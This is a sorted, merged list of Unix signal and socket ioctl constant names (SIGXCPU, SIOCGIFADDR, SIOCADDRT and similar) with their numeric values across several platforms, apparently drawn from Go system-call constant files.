SIGWINCH  = syscall.Signal(0x14)
SIGWINCH  = syscall.Signal(0x1c)
SIGXCPU     = syscall.Signal(0x18)
SIGXCPU    = syscall.Signal(0x1e)
SIGXCPU   = Signal(29)
SIGXCPU   = syscall.Signal(0x18)
SIGXCPU   = syscall.Signal(0x1e)
SIGXFSZ     = syscall.Signal(0x19)
SIGXFSZ    = syscall.Signal(0x1f)
SIGXFSZ   = Signal(30)
SIGXFSZ   = syscall.Signal(0x19)
SIGXFSZ   = syscall.Signal(0x1f)
SIGXRES    = syscall.Signal(0x26)
SIG[
SIG[A-Z0-9]
SIOC/ 
SIOCADDDLCI                                 = 0x8980
SIOCADDIFVIPA                 = 0x20006942
SIOCADDMTU                    = -0x7ffb9690
SIOCADDMULTI                                = 0x8931
SIOCADDMULTI                            = 0x80206931
SIOCADDMULTI                      = 0x80206931
SIOCADDMULTI                      = 0x80906931
SIOCADDMULTI                   = 0x80206931
SIOCADDMULTI                  = -0x7fdf96cf
SIOCADDNETID                  = -0x7fd796a9
SIOCADDRT                                   = 0x890b
SIOCADDRT                         = 0x8030720a
SIOCADDRT                         = 0x8038720a
SIOCADDRT                         = 0x8040720a
SIOCADDRT                     = -0x7fc78df6
SIOCADDRT                     = -0x7fcf8df6
SIOCADDRT       = 0x8030720a
SIOCAIFADDR                             = 0x8040691a
SIOCAIFADDR                       = 0x8040691a
SIOCAIFADDR                    = 0x8040691a
SIOCAIFADDR                   = -0x7fbf96e6
SIOCAIFGROUP                      = 0x80246987
SIOCAIFGROUP                      = 0x80286987
SIOCAIFGROUP                   = 0x80246987
SIOCAIFGROUP                   = 0x80286987
SIOCALIFADDR                      = 0x8118691b
SIOCALIFADDR                      = 0x8118691c
SIOCALIFADDR                      = 0x8218691c
SIOCALIFADDR    = 0x8118691b
SIOCARPIPLL                             = 0xc0206928
SIOCATMARK                              = 0x40047307
SIOCATMARK                        = 0x40047307
SIOCATMARK                       = 0x40047307
SIOCATMARK                       = 0x8905
SIOCATMARK                     = 0x40047307
SIOCATMARK                    = 0x40047307
SIOCAUTOADDR                            = 0xc0206926
SIOCAUTONETMASK                         = 0x80206927
SIOCBONDCHANGEACTIVE                        = 0x8995
SIOCBONDENSLAVE                             = 0x8990
SIOCBONDINFOQUERY                           = 0x8994
SIOCBONDRELEASE                             = 0x8991
SIOCBONDSETHWADDR                           = 0x8992
SIOCBONDSLAVEINFOQUERY                      = 0x8993
SIOCBRADDBR                                 = 0x89a0
SIOCBRADDIF                                 = 0x89a2
SIOCBRDELBR                                 = 0x89a1
SIOCBRDELIF                                 = 0x89a3
SIOCBRDGADD                       = 0x8054693c
SIOCBRDGADD                       = 0x8060693c
SIOCBRDGADDL                      = 0x80606949
SIOCBRDGADDS                      = 0x80546941
SIOCBRDGADDS                      = 0x80606941
SIOCBRDGARL                       = 0x806e694d
SIOCBRDGARL                       = 0x808c694d
SIOCBRDGDADDR                     = 0x81286947
SIOCBRDGDEL                       = 0x8054693d
SIOCBRDGDEL                       = 0x8060693d
SIOCBRDGDELS                      = 0x80546942
SIOCBRDGDELS                      = 0x80606942
SIOCBRDGFLUSH                     = 0x80546948
SIOCBRDGFLUSH                     = 0x80606948
SIOCBRDGFRL                       = 0x806e694e
SIOCBRDGFRL                       = 0x808c694e
SIOCBRDGGCACHE                    = 0xc0146941
SIOCBRDGGCACHE                    = 0xc0186941
SIOCBRDGGFD                       = 0xc0146952
SIOCBRDGGFD                       = 0xc0186952
SIOCBRDGGHT                       = 0xc0146951
SIOCBRDGGHT                       = 0xc0186951
SIOCBRDGGIFFLGS                   = 0xc054693e
SIOCBRDGGIFFLGS                   = 0xc060693e
SIOCBRDGGMA                       = 0xc0146953
SIOCBRDGGMA                       = 0xc0186953
SIOCBRDGGPARAM                    = 0xc03c6958
SIOCBRDGGPARAM                    = 0xc0406958
SIOCBRDGGPRI                      = 0xc0146950
SIOCBRDGGPRI                      = 0xc0186950
SIOCBRDGGRL                       = 0xc028694f
SIOCBRDGGRL                       = 0xc030694f
SIOCBRDGGSIFS                     = 0xc054693c
SIOCBRDGGTO                       = 0xc0146946
SIOCBRDGGTO                       = 0xc0186946
SIOCBRDGIFS                       = 0xc0546942
SIOCBRDGIFS                       = 0xc0606942
SIOCBRDGRTS                       = 0xc0186943
SIOCBRDGRTS                       = 0xc0206943
SIOCBRDGSADDR                     = 0xc1286944
SIOCBRDGSCACHE                    = 0x80146940
SIOCBRDGSCACHE                    = 0x80186940
SIOCBRDGSFD                       = 0x80146952
SIOCBRDGSFD                       = 0x80186952
SIOCBRDGSHT                       = 0x80146951
SIOCBRDGSHT                       = 0x80186951
SIOCBRDGSIFCOST                   = 0x80546955
SIOCBRDGSIFCOST                   = 0x80606955
SIOCBRDGSIFFLGS                   = 0x8054693f
SIOCBRDGSIFFLGS                   = 0x8060693f
SIOCBRDGSIFPRIO                   = 0x80546954
SIOCBRDGSIFPRIO                   = 0x80606954
SIOCBRDGSIFPROT                   = 0x8060694a
SIOCBRDGSMA                       = 0x80146953
SIOCBRDGSMA                       = 0x80186953
SIOCBRDGSPRI                      = 0x80146950
SIOCBRDGSPRI                      = 0x80186950
SIOCBRDGSPROTO                    = 0x8014695a
SIOCBRDGSPROTO                    = 0x8018695a
SIOCBRDGSTO                       = 0x80146945
SIOCBRDGSTO                       = 0x80186945
SIOCBRDGSTXHC                     = 0x80146959
SIOCBRDGSTXHC                     = 0x80186959
SIOCDARP                                    = 0x8953
SIOCDARP                      = -0x7fb396e0
SIOCDARP                      = -0x7fdb96e0
SIOCDELDLCI                                 = 0x8981
SIOCDELIFVIPA                 = 0x20006943
SIOCDELLABEL                      = 0x80206997
SIOCDELMTU                    = -0x7ffb968f
SIOCDELMULTI                                = 0x8932
SIOCDELMULTI                            = 0x80206932
SIOCDELMULTI                      = 0x80206932
SIOCDELMULTI                      = 0x80906932
SIOCDELMULTI                   = 0x80206932
SIOCDELMULTI                  = -0x7fdf96ce
SIOCDELPMTU                   = -0x7fd78ff6
SIOCDELRT                                   = 0x890c
SIOCDELRT                         = 0x8030720b
SIOCDELRT                         = 0x8038720b
SIOCDELRT                         = 0x8040720b
SIOCDELRT                     = -0x7fc78df5
SIOCDELRT                     = -0x7fcf8df5
SIOCDELRT       = 0x8030720b
SIOCDEVPRIVATE                              = 0x89f0
SIOCDIFADDR                                 = 0x8936
SIOCDIFADDR                             = 0x80206919
SIOCDIFADDR                       = 0x80206919
SIOCDIFADDR                       = 0x80906919
SIOCDIFADDR                    = 0x80206919
SIOCDIFADDR                   = -0x7fd796e7
SIOCDIFGROUP                      = 0x80246989
SIOCDIFGROUP                      = 0x80286989
SIOCDIFGROUP                   = 0x80246989
SIOCDIFGROUP                   = 0x80286989
SIOCDIFPARENT                     = 0x802069b4
SIOCDIFPHYADDR                          = 0x80206941
SIOCDIFPHYADDR                    = 0x80206949
SIOCDIFPHYADDR                    = 0x80906949
SIOCDIFPHYADDR                 = 0x80206949
SIOCDLIFADDR                      = 0x8118691d
SIOCDLIFADDR                      = 0x8118691e
SIOCDLIFADDR                      = 0x8218691e
SIOCDLIFADDR    = 0x8118691d
SIOCDNETOPT                   = -0x3ffe9680
SIOCDPWE3NEIGHBOR                 = 0x802069de
SIOCDRARP                                   = 0x8960
SIOCDVNETID                       = 0x802069af
SIOCDX25XLATE                 = -0x7fd7969b
SIOCDXARP                     = -0x7fff9658
SIOCETHTOOL                                 = 0x8946
SIOCFIFADDR                   = -0x7fdf966d
SIOCGARP                                    = 0x8954
SIOCGARP                      = -0x3fb396da
SIOCGARP                      = -0x3fdb96e1
SIOCGDRVSPEC                            = 0xc028697b
SIOCGDRVSPEC                      = 0xc01c697b
SIOCGDRVSPEC                      = 0xc028697b
SIOCGDRVSPEC                   = 0xc01c697b
SIOCGDRVSPEC                   = 0xc028697b
SIOCGDSTINFO                  = -0x3fff965c
SIOCGENADDR                   = -0x3fdf96ab
SIOCGENPSTATS                 = -0x3fdf96c7
SIOCGETKALIVE                     = 0xc01869a4
SIOCGETLABEL                      = 0x8020699a
SIOCGETLINKNAME                             = 0x89e0
SIOCGETLSGCNT                 = -0x3fef8deb
SIOCGETMPWCFG                     = 0xc02069ae
SIOCGETMTUS                   = 0x2000696f
SIOCGETNAME                   = 0x40107334
SIOCGETNODEID                               = 0x89e1
SIOCGETPEER                   = 0x40107335
SIOCGETPFLOW                      = 0xc02069fe
SIOCGETPFSYNC                     = 0xc02069f8
SIOCGETPFSYNC                     = 0xc09069f8
SIOCGETPROP                   = -0x3fff8f44
SIOCGETSGCNT                      = 0xc0147534
SIOCGETSGCNT                      = 0xc0207210
SIOCGETSGCNT                      = 0xc0207534
SIOCGETSGCNT                   = 0xc0147210
SIOCGETSGCNT                   = 0xc0207210
SIOCGETSGCNT                  = -0x3feb8acc
SIOCGETSGCNT                  = -0x3feb8deb
SIOCGETSYNC                   = -0x3fdf96d3
SIOCGETVIFCNT                     = 0xc0147533
SIOCGETVIFCNT                     = 0xc028720f
SIOCGETVIFCNT                     = 0xc0287533
SIOCGETVIFCNT                  = 0xc014720f
SIOCGETVIFCNT                  = 0xc028720f
SIOCGETVIFCNT                 = -0x3feb8acd
SIOCGETVIFCNT                 = -0x3feb8dec
SIOCGETVLAN                             = 0xc020697f
SIOCGETVLAN                       = 0xc0206990
SIOCGHIWAT                              = 0x40047301
SIOCGHIWAT                        = 0x40047301
SIOCGHIWAT                     = 0x40047301
SIOCGHIWAT                    = 0x40047301
SIOCGHWADDR                    = 0xc020693e
SIOCGHWTSTAMP                               = 0x89b1
SIOCGI2C                       = 0xc020693d
SIOCGIF6LOWPAN                          = 0xc02069c5
SIOCGIFADDR                                 = 0x8915
SIOCGIFADDR                             = 0xc0206921
SIOCGIFADDR                       = 0xc0206921
SIOCGIFADDR                       = 0xc0906921
SIOCGIFADDR                    = 0xc0206921
SIOCGIFADDR                   = -0x3fd796df
SIOCGIFADDR                   = -0x3fdf96f3
SIOCGIFADDRPREF                   = 0xc0946920
SIOCGIFADDRPREF                   = 0xc0986920
SIOCGIFADDRS                  = 0x2000698c
SIOCGIFALIAS                      = 0xc040691b
SIOCGIFALIAS                      = 0xc0406929
SIOCGIFALTMTU                           = 0xc0206948
SIOCGIFASYNCMAP                         = 0xc020697c
SIOCGIFASYNCMAP                   = 0xc020697c
SIOCGIFBAUDRATE               = -0x3fdf9669
SIOCGIFBOND                             = 0xc0206947
SIOCGIFBR                                   = 0x8940
SIOCGIFBRDADDR                              = 0x8919
SIOCGIFBRDADDR                          = 0xc0206923
SIOCGIFBRDADDR                    = 0xc0206923
SIOCGIFBRDADDR                    = 0xc0906923
SIOCGIFBRDADDR                 = 0xc0206923
SIOCGIFBRDADDR                = -0x3fd796dd
SIOCGIFBRDADDR                = -0x3fdf96e9
SIOCGIFCAP                              = 0xc020695b
SIOCGIFCAP                        = 0xc020691f
SIOCGIFCAP                        = 0xc0206976
SIOCGIFCAP                     = 0xc020691f
SIOCGIFCONF                                 = 0x8912
SIOCGIFCONF                             = 0xc00c6924
SIOCGIFCONF                       = 0xc0086924
SIOCGIFCONF                       = 0xc0086926
SIOCGIFCONF                       = 0xc0106924
SIOCGIFCONF                       = 0xc0106926
SIOCGIFCONF                    = 0xc0086924
SIOCGIFCONF                    = 0xc0106924
SIOCGIFCONF                   = -0x3fef96bb
SIOCGIFCONF                   = -0x3ff796a4
SIOCGIFCONF                   = -0x3ff796bb
SIOCGIFCONFGLOB               = -0x3fef9670
SIOCGIFCONFGLOB               = -0x3ff79670
SIOCGIFCOUNT                                = 0x8938
SIOCGIFDATA                       = 0xc020691b
SIOCGIFDATA                       = 0xc0206926
SIOCGIFDATA                       = 0xc0946985
SIOCGIFDATA                       = 0xc0986985
SIOCGIFDESCR                      = 0xc0206981
SIOCGIFDESCR                   = 0xc020692a
SIOCGIFDEVMTU                           = 0xc0206944
SIOCGIFDLT                        = 0xc0906977
SIOCGIFDSTADDR                              = 0x8917
SIOCGIFDSTADDR                          = 0xc0206922
SIOCGIFDSTADDR                    = 0xc0206922
SIOCGIFDSTADDR                    = 0xc0906922
SIOCGIFDSTADDR                 = 0xc0206922
SIOCGIFDSTADDR                = -0x3fd796de
SIOCGIFDSTADDR                = -0x3fdf96f1
SIOCGIFENCAP                                = 0x8925
SIOCGIFFIB                     = 0xc020695c
SIOCGIFFLAGS                                = 0x8913
SIOCGIFFLAGS                            = 0xc0206911
SIOCGIFFLAGS                      = 0xc0206911
SIOCGIFFLAGS                      = 0xc0906911
SIOCGIFFLAGS                   = 0xc0206911
SIOCGIFFLAGS                  = -0x3fd796ef
SIOCGIFFLAGS                  = -0x3fdf96ef
SIOCGIFFUNCTIONALTYPE                   = 0xc02069ad
SIOCGIFGATTR                      = 0xc024698b
SIOCGIFGATTR                      = 0xc028698b
SIOCGIFGENERIC                          = 0xc020693a
SIOCGIFGENERIC                    = 0xc020693a
SIOCGIFGENERIC                    = 0xc090693a
SIOCGIFGENERIC                 = 0xc020693a
SIOCGIFGIDLIST                = 0x20006968
SIOCGIFGLIST                      = 0xc028698d
SIOCGIFGMEMB                      = 0xc024698a
SIOCGIFGMEMB                      = 0xc028698a
SIOCGIFGMEMB                   = 0xc024698a
SIOCGIFGMEMB                   = 0xc028698a
SIOCGIFGROUP                      = 0xc0246988
SIOCGIFGROUP                      = 0xc0286988
SIOCGIFGROUP                   = 0xc0246988
SIOCGIFGROUP                   = 0xc0286988
SIOCGIFHARDMTU                    = 0xc02069a5
SIOCGIFHWADDR                               = 0x8927
SIOCGIFHWADDR                 = -0x3fab966b
SIOCGIFHWADDR                 = -0x3fdf9647
SIOCGIFINDEX                                = 0x8933
SIOCGIFINDEX                      = 0xc0206920
SIOCGIFINDEX                   = 0xc0206920
SIOCGIFINDEX                  = -0x3fdf96a6
SIOCGIFKPI                              = 0xc0206987
SIOCGIFLLPRIO                     = 0xc02069b6
SIOCGIFMAC                              = 0xc0206982
SIOCGIFMAC                     = 0xc0206926
SIOCGIFMAP                                  = 0x8970
SIOCGIFMEDIA                            = 0xc02c6938
SIOCGIFMEDIA                      = 0xc0286936
SIOCGIFMEDIA                      = 0xc0306936
SIOCGIFMEDIA                      = 0xc0306938
SIOCGIFMEDIA                      = 0xc0406938
SIOCGIFMEDIA                   = 0xc0286938
SIOCGIFMEDIA                   = 0xc0306938
SIOCGIFMEM                                  = 0x891f
SIOCGIFMEM                    = -0x3fdf96ed
SIOCGIFMETRIC                               = 0x891d
SIOCGIFMETRIC                           = 0xc0206917
SIOCGIFMETRIC                     = 0xc0206917
SIOCGIFMETRIC                     = 0xc0906917
SIOCGIFMETRIC                  = 0xc0206917
SIOCGIFMETRIC                 = -0x3fd796e9
SIOCGIFMETRIC                 = -0x3fdf96e5
SIOCGIFMTU                                  = 0x8921
SIOCGIFMTU                              = 0xc0206933
SIOCGIFMTU                        = 0xc0206933
SIOCGIFMTU                        = 0xc020697e
SIOCGIFMTU                        = 0xc090697e
SIOCGIFMTU                     = 0xc0206933
SIOCGIFMTU                    = -0x3fd796aa
SIOCGIFMTU                    = -0x3fdf96ea
SIOCGIFMUXID                  = -0x3fdf96a8
SIOCGIFNAME                                 = 0x8910
SIOCGIFNETMASK                              = 0x891b
SIOCGIFNETMASK                          = 0xc0206925
SIOCGIFNETMASK                    = 0xc0206925
SIOCGIFNETMASK                    = 0xc0906925
SIOCGIFNETMASK                 = 0xc0206925
SIOCGIFNETMASK                = -0x3fd796db
SIOCGIFNETMASK                = -0x3fdf96e7
SIOCGIFNUM                    = 0x40046957
SIOCGIFOPTIONS                = -0x3fd796d6
SIOCGIFPAIR                       = 0xc02069b1
SIOCGIFPARENT                     = 0xc02069b3
SIOCGIFPDSTADDR                         = 0xc0206940
SIOCGIFPDSTADDR                   = 0xc0206948
SIOCGIFPDSTADDR                   = 0xc0906948
SIOCGIFPDSTADDR                = 0xc0206948
SIOCGIFPFLAGS                               = 0x8935
SIOCGIFPHYS                             = 0xc0206935
SIOCGIFPHYS                       = 0xc0206935
SIOCGIFPHYS                    = 0xc0206935
SIOCGIFPOLLCPU                    = 0xc020697e
SIOCGIFPRIORITY                   = 0xc020699c
SIOCGIFPSRCADDR                         = 0xc020693f
SIOCGIFPSRCADDR                   = 0xc0206947
SIOCGIFPSRCADDR                   = 0xc0906947
SIOCGIFPSRCADDR                = 0xc0206947
SIOCGIFRDOMAIN                    = 0xc02069a0
SIOCGIFRSSHASH                 = 0xc0186997
SIOCGIFRSSKEY                  = 0xc0946996
SIOCGIFRTLABEL                    = 0xc0206983
SIOCGIFRXR                        = 0x802069aa
SIOCGIFSFFPAGE                    = 0xc1126939
SIOCGIFSLAVE                                = 0x8929
SIOCGIFSTATUS                           = 0xc331693d
SIOCGIFSTATUS                     = 0xc331693b
SIOCGIFSTATUS                  = 0xc331693b
SIOCGIFTIMESLOT                   = 0xc0206986
SIOCGIFTSOLEN                     = 0xc0206980
SIOCGIFTXQLEN                               = 0x8942
SIOCGIFVLAN                                 = 0x8982
SIOCGIFVLAN                             = 0xc020697f
SIOCGIFWAKEFLAGS                        = 0xc0206988
SIOCGIFXFLAGS                     = 0xc020699e
SIOCGIFXMEDIA                           = 0xc02c6948
SIOCGIFXMEDIA                  = 0xc028698b
SIOCGIFXMEDIA                  = 0xc030698b
SIOCGIP6ADDRPOLICY            = -0x3fff965e
SIOCGIPMSFILTER               = -0x3ffb964c
SIOCGISNO                     = -0x3fd79695
SIOCGLANPCP                    = 0xc0206998
SIOCGLIFADDR                      = 0xc118691c
SIOCGLIFADDR                      = 0xc118691d
SIOCGLIFADDR                      = 0xc218691d
SIOCGLIFADDR                  = -0x3f87968f
SIOCGLIFADDR    = 0xc118691c
SIOCGLIFBINDING               = -0x3f879666
SIOCGLIFBRDADDR               = -0x3f879685
SIOCGLIFCONF                  = -0x3fef965b
SIOCGLIFDADSTATE              = -0x3f879642
SIOCGLIFDSTADDR               = -0x3f87968d
SIOCGLIFFLAGS                 = -0x3f87968b
SIOCGLIFGROUPINFO             = -0x3f4b9663
SIOCGLIFGROUPNAME             = -0x3f879664
SIOCGLIFHWADDR                = -0x3f879640
SIOCGLIFINDEX                 = -0x3f87967b
SIOCGLIFLNKINFO               = -0x3f879674
SIOCGLIFMETRIC                = -0x3f879681
SIOCGLIFMTU                   = -0x3f879686
SIOCGLIFMUXID                 = -0x3f87967d
SIOCGLIFNETMASK               = -0x3f879683
SIOCGLIFNUM                   = -0x3ff3967e
SIOCGLIFPHYADDR                   = 0xc118694b
SIOCGLIFPHYADDR                   = 0xc218694b
SIOCGLIFPHYADDR = 0xc118694b
SIOCGLIFPHYDF                     = 0xc02069c2
SIOCGLIFPHYECN                    = 0xc02069c8
SIOCGLIFPHYRTABLE                 = 0xc02069a2
SIOCGLIFPHYTTL                    = 0xc02069a9
SIOCGLIFSRCOF                 = -0x3fef964f
SIOCGLIFSUBNET                = -0x3f879676
SIOCGLIFTOKEN                 = -0x3f879678
SIOCGLIFUSESRC                = -0x3f879651
SIOCGLIFZONE                  = -0x3f879656
SIOCGLINKSTR                      = 0xc01c6987
SIOCGLINKSTR                      = 0xc0286987
SIOCGLOADF                    = -0x3ffb967e
SIOCGLOWAT                              = 0x40047303
SIOCGLOWAT                        = 0x40047303
SIOCGLOWAT                     = 0x40047303
SIOCGLOWAT                    = 0x40047303
SIOCGMIIPHY                                 = 0x8947
SIOCGMIIREG                                 = 0x8948
SIOCGMSFILTER                 = -0x3ffb964e
SIOCGNETOPT                   = -0x3ffe96a5
SIOCGNETOPT1                  = -0x3fdf967f
SIOCGNMTUS                    = 0x2000696e
SIOCGPGRP                               = 0x40047309
SIOCGPGRP                         = 0x40047309
SIOCGPGRP                        = 0x40047309
SIOCGPGRP                        = 0x8904
SIOCGPGRP                      = 0x40047309
SIOCGPGRP                     = 0x40047309
SIOCGPPPCSTATS                              = 0x89f2
SIOCGPPPSTATS                               = 0x89f0
SIOCGPPPVER                                 = 0x89f1
SIOCGPRIVATE_0                    = 0xc0206950
SIOCGPRIVATE_0                 = 0xc0206950
SIOCGPRIVATE_1                    = 0xc0206951
SIOCGPRIVATE_1                 = 0xc0206951
SIOCGPWE3                         = 0xc0206998
SIOCGPWE3CTRLWORD                 = 0xc02069dc
SIOCGPWE3FAT                      = 0xc02069dd
SIOCGPWE3NEIGHBOR                 = 0xc21869de
SIOCGRARP                                   = 0x8961
SIOCGRXHPRIO                      = 0xc02069db
SIOCGSIZIFCONF                = 0x4004696a
SIOCGSKNS                                   = 0x894c
SIOCGSPPPPARAMS                   = 0xc0206994
SIOCGSRCFILTER                = -0x3fe796cb
SIOCGSTAMP                                  = 0x8906
SIOCGSTAMP                    = -0x3fef9646
SIOCGSTAMPNS                                = 0x8907
SIOCGSTAMPNS_NEW                 = 0x40108907
SIOCGSTAMPNS_NEW                 = 0x80108907
SIOCGSTAMPNS_OLD                            = 0x8907
SIOCGSTAMP_NEW                   = 0x40108906
SIOCGSTAMP_NEW                   = 0x80108906
SIOCGSTAMP_OLD                              = 0x8906
SIOCGTUNEPHASE                = -0x3ffb9676
SIOCGTUNFIB                    = 0xc020695e
SIOCGTXHPRIO                      = 0xc02069c6
SIOCGUMBINFO                      = 0xc02069be
SIOCGUMBPARAM                     = 0xc02069c0
SIOCGVH                           = 0xc02069f6
SIOCGVH                           = 0xc0906983
SIOCGVNETFLOWID                   = 0xc02069c4
SIOCGVNETID                       = 0xc02069a7
SIOCGX25XLATE                 = -0x3fd7969c
SIOCGXARP                     = -0x3fff9659
SIOCIFAFATTACH                    = 0x801169ab
SIOCIFAFDETACH                    = 0x801169ac
SIOCIFATTACH                  = -0x7fdf9699
SIOCIFCREATE                            = 0xc0206978
SIOCIFCREATE                      = 0x8020697a
SIOCIFCREATE                      = 0x8090697a
SIOCIFCREATE                      = 0xc020697a
SIOCIFCREATE                   = 0xc020697a
SIOCIFCREATE2                           = 0xc020697a
SIOCIFCREATE2                     = 0xc020697c
SIOCIFCREATE2                  = 0xc020697c
SIOCIFDESTROY                           = 0x80206979
SIOCIFDESTROY                     = 0x80206979
SIOCIFDESTROY                     = 0x80906979
SIOCIFDESTROY                  = 0x80206979
SIOCIFDETACH                  = -0x7fdf969a
SIOCIFDETACH                  = -0x7fdf96c8
SIOCIFGCLONERS                          = 0xc0106981
SIOCIFGCLONERS                    = 0xc00c6978
SIOCIFGCLONERS                    = 0xc0106978
SIOCIFGCLONERS                 = 0xc00c6978
SIOCIFGCLONERS                 = 0xc0106978
SIOCIFGETPKEY                 = -0x7fdf969b
SIOCIF_ATM_DARP               = -0x7fdf9683
SIOCIF_ATM_DUMPARP            = -0x7fdf9685
SIOCIF_ATM_GARP               = -0x7fdf9682
SIOCIF_ATM_IDLE               = -0x7fdf9686
SIOCIF_ATM_SARP               = -0x7fdf9681
SIOCIF_ATM_SNMPARP            = -0x7fdf9687
SIOCIF_ATM_SVC                = -0x7fdf9684
SIOCIF_ATM_UBR                = -0x7fdf9688
SIOCIF_DEVHEALTH              = -0x7ffb966c
SIOCIF_IB_ARP_INCOMP          = -0x7fdf9677
SIOCIF_IB_ARP_TIMER           = -0x7fdf9678
SIOCIF_IB_CLEAR_PINFO         = -0x3fdf966f
SIOCIF_IB_DEL_ARP             = -0x7fdf967f
SIOCIF_IB_DEL_PINFO           = -0x3fdf9670
SIOCIF_IB_DUMP_ARP            = -0x7fdf9680
SIOCIF_IB_GET_ARP             = -0x7fdf967e
SIOCIF_IB_GET_INFO            = -0x3f879675
SIOCIF_IB_GET_STATS           = -0x3f879672
SIOCIF_IB_NOTIFY_ADDR_REM     = -0x3f87966a
SIOCIF_IB_RESET_STATS         = -0x3f879671
SIOCIF_IB_RESIZE_CQ           = -0x7fdf9679
SIOCIF_IB_SET_ARP             = -0x7fdf967d
SIOCIF_IB_SET_PKEY            = -0x7fdf967c
SIOCIF_IB_SET_PORT            = -0x7fdf967b
SIOCIF_IB_SET_QKEY            = -0x7fdf9676
SIOCIF_IB_SET_QSIZE           = -0x7fdf967a
SIOCILB                       = -0x3ffb9645
SIOCINITIFADDR                    = 0xc0446984
SIOCINITIFADDR                    = 0xc0706984
SIOCINQ                          = 0x4004667f
SIOCINQ                          = 0x467f
SIOCINQ                          = 0x541b
SIOCKCMATTACH                               = 0x89e0
SIOCKCMCLONE                                = 0x89e2
SIOCKCMUNATTACH                             = 0x89e1
SIOCLIFADDIF                  = -0x3f879691
SIOCLIFDELND                  = -0x7f879673
SIOCLIFGETND                  = -0x3f879672
SIOCLIFREMOVEIF               = -0x7f879692
SIOCLIFSETND                  = -0x7f879671
SIOCLISTIFVIPA                = 0x20006944
SIOCLOWER                     = -0x7fdf96d7
SIOCOUTQ                         = 0x40047473
SIOCOUTQ                         = 0x5411
SIOCOUTQ                         = 0x7472
SIOCOUTQNSD                                 = 0x894b
SIOCPROTOPRIVATE                            = 0x89e0
SIOCRSLVMULTI                           = 0xc010693b
SIOCRTMSG                                   = 0x890d
SIOCSARP                                    = 0x8955
SIOCSARP                      = -0x7fb396e2
SIOCSARP                      = -0x7fdb96e2
SIOCSCTPGOPT                  = -0x3fef9653
SIOCSCTPPEELOFF               = -0x3ffb9652
SIOCSCTPSOPT                  = -0x7fef9654
SIOCSDRVSPEC                            = 0x8028697b
SIOCSDRVSPEC                      = 0x801c697b
SIOCSDRVSPEC                      = 0x8028697b
SIOCSDRVSPEC                   = 0x801c697b
SIOCSDRVSPEC                   = 0x8028697b
SIOCSENABLESDP                = -0x3ffb9649
SIOCSETKALIVE                     = 0x801869a3
SIOCSETLABEL                      = 0x80206999
SIOCSETMPWCFG                     = 0x802069ad
SIOCSETPFLOW                      = 0x802069fd
SIOCSETPFSYNC                     = 0x802069f7
SIOCSETPFSYNC                     = 0x809069f7
SIOCSETPROP                   = -0x7ffb8f43
SIOCSETSYNC                   = -0x7fdf96d4
SIOCSETVLAN                             = 0x8020697e
SIOCSETVLAN                       = 0x8020698f
SIOCSHIWAT                              = 0x80047300
SIOCSHIWAT                        = 0x80047300
SIOCSHIWAT                     = 0x80047300
SIOCSHIWAT                    = -0x7ffb8d00
SIOCSHIWAT                    = 0x80047300
SIOCSHIWAT                    = 0xffffffff80047300
SIOCSHWTSTAMP                               = 0x89b0
SIOCSIF6LOWPAN                          = 0x802069c4
SIOCSIFADDR                                 = 0x8916
SIOCSIFADDR                             = 0x8020690c
SIOCSIFADDR                       = 0x8020690c
SIOCSIFADDR                       = 0x8090690c
SIOCSIFADDR                    = 0x8020690c
SIOCSIFADDR                   = -0x7fd796f4
SIOCSIFADDR                   = -0x7fdf96f4
SIOCSIFADDRORI                = -0x7fdb9673
SIOCSIFADDRPREF                   = 0x8094691f
SIOCSIFADDRPREF                   = 0x8098691f
SIOCSIFALTMTU                           = 0x80206945
SIOCSIFASYNCMAP                         = 0x8020697d
SIOCSIFASYNCMAP                   = 0x8020697d
SIOCSIFBOND                             = 0x80206946
SIOCSIFBR                                   = 0x8941
SIOCSIFBRDADDR                              = 0x891a
SIOCSIFBRDADDR                          = 0x80206913
SIOCSIFBRDADDR                    = 0x80206913
SIOCSIFBRDADDR                    = 0x80906913
SIOCSIFBRDADDR                 = 0x80206913
SIOCSIFBRDADDR                = -0x7fd796ed
SIOCSIFBRDADDR                = -0x7fdf96e8
SIOCSIFCAP                              = 0x8020695a
SIOCSIFCAP                        = 0x8020691e
SIOCSIFCAP                        = 0x80206975
SIOCSIFCAP                     = 0x8020691e
SIOCSIFDESCR                      = 0x80206980
SIOCSIFDESCR                   = 0x80206929
SIOCSIFDSTADDR                              = 0x8918
SIOCSIFDSTADDR                          = 0x8020690e
SIOCSIFDSTADDR                    = 0x8020690e
SIOCSIFDSTADDR                    = 0x8090690e
SIOCSIFDSTADDR                 = 0x8020690e
SIOCSIFDSTADDR                = -0x7fd796f2
SIOCSIFDSTADDR                = -0x7fdf96f2
SIOCSIFENCAP                                = 0x8926
SIOCSIFFIB                     = 0x8020695d
SIOCSIFFLAGS                                = 0x8914
SIOCSIFFLAGS                            = 0x80206910
SIOCSIFFLAGS                      = 0x80206910
SIOCSIFFLAGS                      = 0x80906910
SIOCSIFFLAGS                   = 0x80206910
SIOCSIFFLAGS                  = -0x7fd796f0
SIOCSIFFLAGS                  = -0x7fdf96f0
SIOCSIFGATTR                      = 0x8024698c
SIOCSIFGATTR                      = 0x8028698c
SIOCSIFGENERIC                          = 0x80206939
SIOCSIFGENERIC                    = 0x80206939
SIOCSIFGENERIC                    = 0x80906939
SIOCSIFGENERIC                 = 0x80206939
SIOCSIFGIDLIST                = 0x20006969
SIOCSIFHWADDR                               = 0x8924
SIOCSIFHWBROADCAST                          = 0x8937
SIOCSIFINDEX                  = -0x7fdf96a5
SIOCSIFKPI                              = 0x80206986
SIOCSIFLINK                                 = 0x8911
SIOCSIFLLADDR                           = 0x8020693c
SIOCSIFLLADDR                     = 0x8020691f
SIOCSIFLLADDR                     = 0x8020693c
SIOCSIFLLADDR                  = 0x8020693c
SIOCSIFLLPRIO                     = 0x802069b5
SIOCSIFMAC                              = 0x80206983
SIOCSIFMAC                     = 0x80206927
SIOCSIFMAP                                  = 0x8971
SIOCSIFMEDIA                            = 0xc0206937
SIOCSIFMEDIA                      = 0xc0206935
SIOCSIFMEDIA                      = 0xc0206937
SIOCSIFMEDIA                      = 0xc0906935
SIOCSIFMEDIA                   = 0xc0206937
SIOCSIFMEM                                  = 0x8920
SIOCSIFMEM                    = -0x7fdf96ee
SIOCSIFMETRIC                               = 0x891e
SIOCSIFMETRIC                           = 0x80206918
SIOCSIFMETRIC                     = 0x80206918
SIOCSIFMETRIC                     = 0x80906918
SIOCSIFMETRIC                  = 0x80206918
SIOCSIFMETRIC                 = -0x7fd796e8
SIOCSIFMETRIC                 = -0x7fdf96e4
SIOCSIFMTU                                  = 0x8922
SIOCSIFMTU                              = 0x80206934
